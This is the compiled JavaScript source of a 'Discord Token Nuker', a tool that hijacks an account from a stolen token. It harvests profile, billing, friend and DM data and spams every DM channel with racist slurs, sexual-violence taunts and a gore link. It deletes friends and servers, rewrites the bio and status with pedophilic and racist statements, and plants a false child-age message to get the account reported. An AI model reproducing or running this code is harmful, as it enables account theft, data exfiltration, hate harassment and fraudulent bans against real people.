"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const node_fs_1 = __importDefault(require("node:fs"));
const promises_1 = __importDefault(require("node:readline/promises"));
const axios_1 = __importDefault(require("axios"));
const ora_1 = __importDefault(require("ora"));
const chalk_1 = __importDefault(require("chalk"));
const node_util_1 = __importDefault(require("node:util"));
const yaml_1 = __importDefault(require("yaml"));
class BillingInfo {
    constructor() {
        this["Type"] = "";
        this["Country"] = "";
        this["Region"] = "";
        this["City"] = "";
        this["ZIP Code"] = "";
        this["Address"] = "";
        this["Expires"] = "";
        this["Billing Name"] = "";
        this["Email"] = "";
        this["Brand"] = "";
        this["Last 4 Digits"] = "";
        this["Valid"] = "false";
    }
}
class UserInfo {
    constructor() {
        this["Basic Info"] = {
            "Displayname": "",
            "Username": "",
            "Discriminator": "None",
            "User ID": "",
            "Email": "",
            "Phone Number": ""
        };
        this["Friends"] = {};
        this["Servers"] = {};
        this["Billing Information"] = {
            "Has Nitro?": "No",
            "Payments": new Array
        };
        this["Gifts"] = {};
        this["Channels"] = new Array;
        this["Direct Messages"] = {};
    }
}
function clear_empty(data) {
    if (!(data instanceof Object) && !(data instanceof Array)) {
        return;
    }
    Object.keys(data).forEach((k) => {
        let v = data[k];
        if (v == null || v == "" || node_util_1.default.isDeepStrictEqual(v, []) || node_util_1.default.isDeepStrictEqual(v, {})) {
            data[k] = null;
            clear_empty(v);
        }
    });
}
function orainput(question) {
    return (0, ora_1.default)(chalk_1.default.red(question.padStart(25, " ")));
}
function pad(x) {
    return chalk_1.default.red(x.padStart(25, ""));
}
let proxies = [];
process.title = "Discord Token Nuker | Made by @nekovada on discord";
function proxy_init() {
    return __awaiter(this, void 0, void 0, function* () {
        yield axios_1.default.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", { responseType: "text" }).then((res) => {
            proxies = res.data.text.toString().split("\n").map((v) => v.split(":"));
        });
    });
}
function headerinit(auth, json) {
    return __awaiter(this, void 0, void 0, function* () {
        if (node_util_1.default.isDeepStrictEqual(proxies, {})) {
            yield proxy_init();
        }
        let proxy = proxies[Math.floor(Math.random() * proxies.length)];
        return {
            headers: {
                Authorization: auth
            },
            proxy: {
                port: Number.parseInt(proxy[1]),
                host: proxy[0],
                protocol: "https"
            }
        };
    });
}
function nuke(token) {
    return __awaiter(this, void 0, void 0, function* () {
        let data = new UserInfo();
        const headers = yield headerinit(token);
        {
            let ui;
            {
                let notif = orainput("Validating token...");
                let info = yield axios_1.default.get("https://discord.com/api/users/@me", headers);
                notif.start();
                if (info.status != 200) {
                    notif.fail(pad("Error! Token is invalid..."));
                    return false;
                }
                ui = info;
                notif.succeed(pad("Successfully validated token"));
            }
            let notif = orainput("Getting basic info...").start();
            let user = ui.data["Username"];
            data["Basic Info"]["Discriminator"] = !(user.match(/[a-z]#0000/)) ? user.substring(user.length - 6, user.length) : "None";
            data["Basic Info"]["Username"] = user.match(/[a-z]#0000/) ? `@${user.substring(user.length - 6)}` : user.substring(user.length - 6);
            data["Basic Info"]["User ID"] = ui["id"];
            data["Basic Info"]["Email"] = ui["email"] || "None provided";
            data["Basic Info"]["Phone Number"] = ui["phone"];
            notif.succeed();
        }
        let notif = orainput("Getting gifts...").start();
        axios_1.default.get("https://discord.com/api/users/@me/entitlements/gifts", headers).then((res) => {
            data["Gifts"] = res.data;
            notif.succeed();
        }).catch(() => notif.fail());
        let fnotif = orainput("Logging friends...");
        yield axios_1.default.get("https://discord.com/api/users/@me/relationships", headers).then((res) => {
            data["Friends"] = res.data;
            fnotif.succeed();
        }).catch(() => fnotif.fail());
        let pnotif = orainput("Getting payment info...").start();
        axios_1.default.get("https://discord.com/api/users/@me/billing/payment-sources", headers).then((res) => {
            res.data.json().then((v) => {
                for (let card of v) {
                    let cred = new BillingInfo();
                    if (card["type"] == 1) {
                        cred["Type"] = "Credit Card";
                        cred["Country"] = card["billing_address"]["country"];
                        cred["Expires"] = `${card["expires_month"]}/${card["expires_year"]}`;
                        cred["Last 4 Digits"] = card["last_4"];
                        cred["Valid"] = !card["Invalid"] ? "True" : "False";
                        cred["Billing Name"] = card["billing_address"]["billing_name"];
                        cred["Brand"] = card["brand"];
                        cred["City"] = card["billing_address"]["city"];
                        cred["ZIP Code"] = card["billing_address"]["postal_code"];
                        cred["Region"] = card["billing_address"]["state"];
                        cred["Address"] = card["billing_address"]["line_1"];
                    }
                    else {
                        cred["Email"] = card["billing_address"]["email"];
                        cred["Valid"] = !card["valid"] ? "True" : "False";
                        cred["City"] = card["billing_address"]["city"];
                        cred["Billing Name"] = card["billing_address"]["billing_name"];
                        cred["Country"] = card["billing_address"]["country"];
                        cred["Region"] = card["billing_address"]["state"];
                        cred["Type"] = "PayPal";
                        cred["Address"] = card["billing_address"]["line_1"];
                        cred["ZIP Code"] = card["billing_address"]["postal_code"];
                    }
                    data["Billing Information"]["Payments"].push(card);
                }
            });
        }).catch(() => pnotif.fail());
        let guildnotif = orainput("Retrieving guilds...");
        yield axios_1.default.get("https://discord.com/api/users/@me/guilds", headers).then((res) => {
            data["Servers"] = res.data;
            guildnotif.succeed();
        });
        let unlucky = data["Friends"][Math.floor(Math.random() * Object.keys(data["Friends"]).length)];
        let unluckychannel = "";
        let dmnotif = orainput("Retrieving dms...").start();
        yield axios_1.default.get("https://discord.com/api/users/@me/channels", headers).then((res) => {
            res.data.json().then((channels) => {
                for (let chan in channels) {
                    let channel = chan;
                    data["Channels"].push(channel["id"]);
                    axios_1.default.get(`https://discord.com/api/channels/${channel["id"]}/search?author=${unlucky["id"]}`).then((res) => {
                        if (res["total_messages"] != 0) {
                            unluckychannel = channel["id"];
                        }
                    });
                    for (let i = 1; i <= 3; ++i) {
                        axios_1.default.get(`https://discord.com/api/channels/${channel["id"]}/search?offset=${i * 25}`).then((res) => {
                            if (data["Direct Messages"][channel["id"]] == undefined) {
                                data["Direct Messages"][channel["id"]] = {};
                            }
                            for (let message in res["messages"]) {
                                let msgs = data["Direct Messages"][channel["id"]];
                                msgs[Object.keys(msgs).length - 1] = message;
                            }
                        });
                    }
                }
            });
        });
        let fkill = orainput("Spamming dms...").start();
        let fri = 0;
        yield axios_1.default.get("https://discord.com/api/users/@me/channels", headers).then((res) => __awaiter(this, void 0, void 0, function* () {
            for (let channel of res.data) {
                for (let _ = 0; _ <= 10; ++_) {
                    yield new Promise(res => axios_1.default.post(`https://discord.com/api/users/@me/channels/${channel["id"]}/messages`, { "message": `Boo Hoo Packwatch lil nigga <@${data["Basic Info"]["User ID"]}> got gang raped by me and anti furry com\nRest in piss nigga kys you won't be missed\nHEIL HITLER\n||@everyone||https://goresee.com/w/myViHMqvTT1ptXxZQB6oem` }, headers).catch((res) => {
                        console.log(chalk_1.default.red("Rahh we are being rate limited\nSleeping for a few seconds..."));
                        setTimeout(() => res(), 1000);
                    }).then(() => res()));
                }
                fri += 1;
            }
        }));
        for (let friend of data["Friends"]) {
            axios_1.default.delete(`https://discord.com/api/users/@me/relationships/${friend["id"]}`, headers);
        }
        fkill.succeed(pad(`Successfully raided ${fri} dms`));
        let dmc = orainput("Closing DMs").start();
        let cc = 0;
        for (let channel of data["Channels"]) {
            axios_1.default.delete(`https://discord.com/api/channels/${channel}`, headers);
            cc += 1;
        }
        dmc.succeed(pad(`Closed ${cc} dms`));
        let srvd = orainput("Leaving servers...").start();
        let srvc = 0;
        for (let guild of data["Servers"]) {
            if (guild["owner"])
                axios_1.default.post(`https://discord.com/api/guild/${guild["id"]}/delete`, {}, headers);
            else
                axios_1.default.delete(`https://discord.com/api/guilds/${guild["id"]}`, headers);
            srvc += 1;
        }
        srvd.succeed(pad(`Left ${srvc} servers`));
        let defd = orainput("Vandalizing account...");
        yield axios_1.default.patch("https://discord.com/api/users/@me/settings", { "bio": "I really love kids, I cant hold this in anymore I am a MAP\nI also have membership in the ku klux klan and are a registered sex offender and hang niggers daily" }, headers);
        yield axios_1.default.patch("https://discord.com/api/users/@me", { "custom-status": "Honestly, black people are subhuman, I think kids should be used as sex slaves too." }, headers);
        defd.succeed(pad("Successfuly vandalized account..."));
        let banfd = orainput("Terming account...").start();
        yield axios_1.default.post(`https://discord.com/api/users/@me/channels/${unlucky["id"]}/messages`, { "message": "I am 8 years old please don't tell anybody" }, headers).then(() => __awaiter(this, void 0, void 0, function* () {
            axios_1.default.post("https://discord.com/api/v6/report", {
                "channel_id": unluckychannel,
                "guild_id": unluckychannel,
                "message_id": (yield axios_1.default.get(`https://discord.com/api/channels/${unluckychannel}/messages/search?offset=25`)).data["messages"][0]
            }).then(() => banfd.succeed()).catch(() => banfd.fail());
        }));
        let logf = orainput("Logging data...").start();
        clear_empty(data);
        node_fs_1.default.writeFile(`./LOG-NUKE-${data["Basic Info"]["User Id"]}.yaml`, yaml_1.default.stringify(data), (err) => logf.fail(`Failed to write file with error: ${(err === null || err === void 0 ? void 0 : err.message) || "No error provided"}`));
        logf.succeed();
        return true;
    });
}
function main() {
    return __awaiter(this, void 0, void 0, function* () {
        console.log(chalk_1.default.red(`

          ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
          █░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░████░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███
          █░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░░░░░██░░▄▀░░████░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███
          █░░░░░░▄▀░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░████░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███
          █████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░█████████░░▄▀░░░░░░▄▀░░██░░▄▀░░████░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░█████████░░▄▀░░████░░▄▀░░███
          █████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░██░░▄▀░░████░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███
          █████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░████░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███
          █████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░██░░▄▀░░████░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███
          █████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░█████████░░▄▀░░██░░▄▀░░░░░░▄▀░░████░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████
          █████░░▄▀░░█████░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░████░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░█
          █████░░▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░░░░░░░░░▄▀░░████░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█
          █████░░░░░░█████░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░████░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█
          ██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⣻⠋⠉⠉⠉⠙⠛⡛⠛⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⠟⠛⠉⠀⠀⠀⠀⠀⢠⣿⡀⠀⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠉⠛⠻⢿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠟⠀⠀⠀⠀⠀⠘⠿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣦⠀⠀⠀⠀⣴⣶⣷⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⡿⠻⣿⣿⣿⣿⣿⣷⣄⠀⢀⣴⠀⠀⠀⢸⣿⣿⣿⣿⣿⣧⠀⠀⣼⣿⣿⣿⣿⣿⡄⠀⠀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀
                                                  ⠀⠀⠀⢠⣾⣿⣿⣿⣿⠋⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⣾⡏⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⡀⢠⣿⣿⣿⣿⣿⣿⡇⠀⠀⢿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⡄⠀⠀⠀
                                                  ⠀⠀⢠⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⣄⠀⠀⣿⣿⣿⣿⣿⣿⣿⠇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡄⠀⠀
                                                  ⠀⢀⣾⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣷⣄⢿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⠀⣴⣾⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣷⡀⠀
                                                  ⠀⣸⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠙⣿⣿⣿⣿⡟⠀⠀⢸⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣧⠀
                                                  ⢠⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠛⠁⠀⠀⠀⠀⠈⠙⠛⠉⠀⠀⠀⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⡆
                                                  ⢸⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡿⢻⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⢀⣠⣤⣤⣀⡀⠀⠀⢹⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣇
                                                  ⣾⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⡿⠃⠀⢘⣿⣿⣿⣿⣿⣿⣷⣤⣾⣿⠿⠿⣿⣿⣿⣶⣄⠘⢿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿
                                                  ⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⢀⣴⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠈⠹⣿⣿⣿⣦⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿
                                                  ⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⡟⠀⠀⠙⢿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠸⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿
                                                  ⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⠁⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣷⣄⠀⢹⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿
                                                  ⢿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣷⣼⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿
                                                  ⢹⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⣿⣿⣿⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⡏
                                                  ⠘⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠙⢿⣿⣿⣿⣿⣿⣯⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⠇
                                                  ⠀⢹⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣄⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡟⠀
                                                  ⠀⠈⢿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣦⣀⠀⠀⣿⣿⣿⠀⠀⠀⣀⣼⣿⣿⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⡿⠁⠀
                                                  ⠀⠀⠘⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣶⣿⣿⣿⣦⣶⣾⣿⡿⠛⠁⠀⠙⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⠃⠀⠀
                                                  ⠀⠀⠀⠘⢿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠿⣿⣿⣿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣦⡀⠀⠀⣠⣿⣿⣿⣿⣿⠃⠀⠀⠀
                                                  ⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣦⣼⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣽⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣤⣤⣤⣟⣉⣀⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
                                                                 ▄︻デ══━一 :3 :3
                                                                 WELCOME TO TOKEN NUKER, SOLDIER!
                                                                 PART OF ANTI-FURRY STARTERPACK MADE BY VYN
                                                                 FOR SUPPORT MESSAGE @NEKOVADA
     

                         ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄ ▄▄
                         ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░ ░░
                         
`));
        let input = promises_1.default.createInterface(process.stdin, process.stdout);
        while (true) {
            process.stdout.write(pad("Enter your token >> "));
            const token = yield input.question('\0');
            let time = Date.now();
            if (yield nuke(token)) {
                console.log(pad(`Successfully nuked token in ${(Date.now() - time) / 1000} seconds`));
            }
            else {
                console.log(pad("Invalid token!"));
            }
        }
    });
}
if (require.main === module) {
    main();
}
